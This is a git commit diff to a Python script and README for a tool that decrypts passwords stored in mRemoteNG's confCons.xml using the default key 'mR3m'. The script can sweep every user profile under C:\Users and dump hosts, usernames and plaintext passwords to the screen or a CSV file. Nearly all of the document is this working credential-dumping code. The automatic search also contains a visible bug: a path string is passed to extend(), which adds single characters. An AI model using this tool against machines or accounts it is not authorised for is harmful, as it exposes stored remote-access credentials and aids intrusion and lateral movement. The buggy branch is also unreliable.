b8cbd1a34c63d219ba50107227b3938e26121df5
CameronEmmett <cameronemmett1995@gmail.com>
2022-12-17 18:32:50 -0500

    Rewrote to remove reliance on shell script. Added option to output to csv. By default, the script will now search for confCons.xml in the default file location under all accessible users.

--- AutoDecrypt-mRemoteNG.py
+++ AutoDecrypt-mRemoteNG.py
@@ -1,54 +1,84 @@
 #!/usr/bin/env python3
 
+import sys
+import argparse
 import hashlib
 import base64
+import os.path
+import csv
 from Cryptodome.Cipher import AES
-import argparse
-import sys
+import xml.etree.ElementTree as ET
+
+def xmlfile(value):
+    if not value.endswith('.xml'):
+        raise argparse.ArgumentTypeError(
+            'Filetype must be .xml')
+    return value
 
 parser = argparse.ArgumentParser(description="Decrypt mRemoteNG passwords.")
-group = parser.add_mutually_exclusive_group()
-group.add_argument("-f", "--file", help="name of file containing mRemoteNG password")
-group.add_argument("-s", "--string", help="base64 string of mRemoteNG password")
-parser.add_argument("-p", "--password", help="Custom password", default="mR3m")
+parser.add_argument("-f", "--file", help="mRemoteNG confCons.xml file location", type=xmlfile)
+parser.add_argument("-p", "--password", help="Custom Password", default="mR3m")
+parser.add_argument("-o", "--output", help="Output results to specified file in csv format")
 args = parser.parse_args()
-encrypted_data = ""
-  
-def decrypt():
-  salt = encrypted_data[:16]
-  associated_data = encrypted_data[:16]
-  nonce = encrypted_data[16:32]
-  ciphertext = encrypted_data[32:-16]
-  tag = encrypted_data[-16:]
-  key = hashlib.pbkdf2_hmac("sha1", args.password.encode(), salt, 1000, dklen=32)
-    
-  cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-  cipher.update(associated_data)
-  plaintext = cipher.decrypt_and_verify(ciphertext, tag)
-  print(line+":"+plaintext.decode("utf-8"))
- 
-
-if len(sys.argv) < 2:
-  parser.print_help(sys.stderr)
-  sys.exit(1)
+configFile = []
 
 if args.file != None:
-  with open(args.file) as f:
-    for line in f:
-      line = line.rstrip("\n")
-      index = line.find(':')
-      encrypted_data = line[index:]
-      encrypted_data = encrypted_data.strip()
-      encrypted_data = base64.b64decode(encrypted_data)
-      decrypt()
+  configFile.append(args.file)
 
-elif args.string != None:
-  encrypted_data = args.string
-  encrypted_data = base64.b64decode(encrypted_data)
-  decrypt()
+elif os.path.exists(r'C:\Users'):
+  print ('Searching users for config file...\n')
+  for user in os.listdir(r'C:\Users'):
+    if os.path.exists('C:/Users/'+user+'/appdata/roaming/mRemoteNG/confCons.xml'):
+      configFile.extend('C:/Users/'+user+'/appdata/roaming/mRemoteNG/confCons.xml')
+      print ('Found config file for: ' + user+ '\n')
 
 else:
-  print("Please use either the file (-f, --file) or string (-s, --string) flag")
+  print('mRemoteNG config file not found. Specify a file with -f')
   sys.exit(1)
 
-sys.exit(1)
+def Decrypt(encryptedPass):
+  if encryptedPass != '':
+    encryptedPass = base64.b64decode(encryptedPass)
+    salt = encryptedPass[:16]
+    associated_data = encryptedPass[:16]
+    nonce = encryptedPass[16:32]
+    ciphertext = encryptedPass[32:-16]
+    tag = encryptedPass[-16:]
+    key = hashlib.pbkdf2_hmac("sha1", args.password.encode(), salt, 1000, dklen=32)
+
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    cipher.update(associated_data)
+    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+    return plaintext.decode("utf-8")
+  else:
+    return encryptedPass
+
+if args.output != None:
+  with open(args.output, 'w') as csvfile:
+    filewriter = csv.writer(csvfile)
+    filewriter.writerow(['Domain', 'Name', 'Host', 'Port', 'Protocol', 'User', 'Password'])
+
+for item in configFile:
+  item = ET.parse(item)
+  root=item.getroot()
+
+  for Node in root.iter('Node'):
+    Domain = Node.get('Domain')
+    Name = Node.get('Name')
+    Host = Node.get('Hostname')
+    Port = Node.get('Port')
+    Protocol = Node.get('Protocol')
+    User = Node.get('Username')
+    Pass = Decrypt(Node.get('Password'))
+
+    if args.output != None:
+     with open(args.output, 'a') as csvfile:
+      filewriter = csv.writer(csvfile)
+      filewriter.writerow([Domain, Name, Host, Port, Protocol, User, Pass])
+
+    else:
+      print (Domain + ' | ' + Name + ' | ' + Host + ' | ' + Port + ' | ' + Protocol + ' | ' + User + ' | ' + Pass)
+
+
+
+
--- README.md
+++ README.md
@@ -2,8 +2,8 @@
 
 Automated decryption of stored credentials from the ConfCons.xml file used by mRemoteNG.
 
-Based on the work done by [haseebT](https://github.com/haseebT/mRemoteNG-Decrypt)
+Inspired by the work of [haseebT](https://github.com/haseebT/mRemoteNG-Decrypt)
 
 ## Usage
 
-`AutoDecrypt-mRemoteNG.sh FILE.xml Output.txt`
+`./AutoDecrypt-mRemoteNG.py [-f FILE] [-p PASSWORD] [-o OUTPUT]`
